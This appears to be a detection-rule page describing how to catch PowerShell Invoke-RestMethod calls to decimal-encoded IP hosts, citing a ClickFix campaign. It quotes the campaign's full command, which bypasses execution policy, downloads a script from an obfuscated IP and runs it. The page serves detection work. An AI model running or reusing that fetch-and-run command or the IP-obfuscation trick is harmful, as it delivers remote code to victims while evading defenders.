PowerShell Invoke-RestMethod To Decimal-Encoded IP Host

HighExperimentalWindows · process creation
Download .yml View on GitHub

What it detects

Detects a command line in which PowerShell's Invoke-RestMethod (alias irm) targets a host written as a single decimal integer instead of a dotted IPv4 address (8 to 10 digits, the range of a decimal-encoded IPv4 address), e.g. "irm 1614733393/12".

Why this rule exists

Huntress reports an unattributed ClickFix campaign in which the pasted command was PowerShell.exe -ExecutionPolicy Bypass "irm 1614733393/12 | Out-File $env:temp\1777.ps1;& $env:temp\1777.ps1", noting that the host is written as a decimal number rather than a dotted IP.

SigmaHQ "Obfuscated IP Download Activity" matches the reported sample only via its octal clause, because the leading digits happen to be 0-7; it does not match decimal hosts generally.

SigmaHQ "Suspicious Invoke-WebRequest Execution With DirectIP" requires '://' in the command line.
